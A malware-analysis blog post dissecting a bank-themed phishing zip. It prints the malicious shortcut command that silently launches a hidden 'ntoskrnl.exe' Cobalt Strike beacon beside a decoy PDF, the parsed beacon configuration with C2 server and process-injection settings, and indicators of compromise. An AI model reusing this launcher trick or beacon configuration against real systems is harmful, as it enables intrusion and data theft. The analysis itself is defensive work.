---
title: BANKING PASSWORD RECOVERY PHISHING EMAIL
published: 2025-04-05
description: A BEACON SAMPLE FROM A BANKING PASSWORD RECOVERY PHISHING EMAIL
tags: [PE, Blogging, Malware Analyze]
category: Blog
draft: false
---

# BANKING PASSWORD RECOVERY PHISHING EMAIL

The receiver was sent a phishing email with the attachment about "XXXXXX-BANK PASSWORD RECOVERY" and the following content inside a zip file is bellow, the executable file was hidden, without turning on the hidden file in Explorer setting we can't see that file.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image.png)

If you look closely, the pdf was a lnk (shortcut) file, we can check the file type by right click on the file and select "properties" to see what will it do

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-1.png)

```
C:\Windows\System32\cmd.exe /c "start "" ".\ntoskrnl.exe" & start "" ".\####changepass\HuongDanDoiMatKhau.pdf""
```

So it will start the real PDF and the PE, the executable name is ntoskrnl.exe, look like it's trying to hide it as one of the important windows process. 

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-2.png)

Digging into the PE file, we can see there is an interesting line here, look like it's starting a notepad.exe process, there also a function where its decoding somekind of hex string after the function that creating the notepad process.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-3.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-4.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-5.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-6.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-7.png)

Basically the MZARUH is a PE header that belong to the [**cobaltstrike**](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike), unfortunatelly this is where I stop, I don't have the knowledge to reverse the rest of the code, the only solution that I found is using a [CobaltStrikeParser script](https://github.com/Sentinel-One/CobaltStrikeParser) using it give me some info below:

```!
E:\ctf\mal_sample\XXXXXXXXX\HuongDanDoiMatKhau\HuongDanDoiMatKhau\CobaltStrikeParser-master\CobaltStrikeParser-master>python parse_beacon_config.py mzaruh.bin
BeaconType                       - HTTPS
Port                             - 443
SleepTime                        - 45000
MaxGetSize                       - 2801745
Jitter                           - 37
MaxDNS                           - Not Found
PublicKey_MD5                    - 4be289551e4d4e3cc5cbacf2b44e6bf9
C2Server                         - www.eff.letsencrypt.one,/jquery-3.3.1.min.js,eff.letsencrypt.one,/jquery-3.3.1.min.js
UserAgent                        - Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rvcs:11.0) like Gecko
HttpPostUri                      - /jquery-3.3.2.min.js
Malleable_C2_Instructions        - Remove 1522 bytes from the end
                                   Remove 84 bytes from the beginning
                                   Remove 3931 bytes from the beginning
                                   Base64 URL-safe decode
                                   XOR mask w/ random key
HttpGet_Metadata                 - ConstHeaders
                                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                                        Referer: http://code.jquery.com/
                                        Accept-Encoding: gzip, deflate
                                        Sec-Fetch-Site: same-origin
                                        Sec-Fetch-Mode: cors
                                        Priority: u=2, i
                                   Metadata
                                        base64url
                                        prepend "__cfduid="
                                        header "Cookie"
HttpPost_Metadata                - ConstHeaders
                                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                                        Referer: http://code.jquery.com/
                                        Accept-Encoding: gzip, deflate
                                        Sec-Fetch-Site: same-origin
                                        Sec-Fetch-Mode: cors
                                        Priority: u=2, i
                                   SessionId
                                        mask
                                        base64url
                                        parameter "__cfduid"
                                   Output
                                        mask
                                        base64url
                                        print
PipeName                         - Not Found
DNS_Idle                         - Not Found
DNS_Sleep                        - Not Found
SSH_Host                         - Not Found
SSH_Port                         - Not Found
SSH_Username                     - Not Found
SSH_Password_Plaintext           - Not Found
SSH_Password_Pubkey              - Not Found
SSH_Banner                       -
HttpGet_Verb                     - GET
HttpPost_Verb                    - POST
HttpPostChunk                    - 0
Spawnto_x86                      - %windir%\syswow64\dllhost.exe
Spawnto_x64                      - %windir%\sysnative\dllhost.exe
CryptoScheme                     - 0
Proxy_Config                     - Not Found
Proxy_User                       - Not Found
Proxy_Password                   - Not Found
Proxy_Behavior                   - Use direct connection
Watermark_Hash                   - NtZOV6JzDr9QkEnX6bobPg==
Watermark                        - 987654321
bStageCleanup                    - True
bCFGCaution                      - False
KillDate                         - 0
bProcInject_StartRWX             - False
bProcInject_UseRWX               - False
bProcInject_MinAllocSize         - 17500
ProcInject_PrependAppend_x86     - b'\x90\x90'
                                   Empty
ProcInject_PrependAppend_x64     - b'\x90\x90'
                                   Empty
ProcInject_Execute               - ntdll:RtlUserThreadStart
                                   CreateThread
                                   NtQueueApcThread-s
                                   CreateRemoteThread
                                   RtlCreateUserThread
ProcInject_AllocationMethod      - NtMapViewOfSection
bUsesCookies                     - True
HostHeader                       -
headersToRemove                  - Not Found
DNS_Beaconing                    - Not Found
DNS_get_TypeA                    - Not Found
DNS_get_TypeAAAA                 - Not Found
DNS_get_TypeTXT                  - Not Found
DNS_put_metadata                 - Not Found
DNS_put_output                   - Not Found
DNS_resolver                     - Not Found
DNS_strategy                     - round-robin
DNS_strategy_rotate_seconds      - -1
DNS_strategy_fail_x              - -1
DNS_strategy_fail_seconds        - -1
Retry_Max_Attempts               - 0
Retry_Increase_Attempts          - 0
Retry_Duration                   - 0
```

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/BankPhishing/image-8.png)

### IOCs 
- **File Name**: ntoskrnl.exe
- **File Hash**: 85063614c9d0cab19c5cf00c048f131e0919cb84f05d96be8923a1bc192a3c25 (sha256)
- **C2 domain:** `www.eff.letsencrypt.one`
- **IP:Port** : 146.190.85.106:443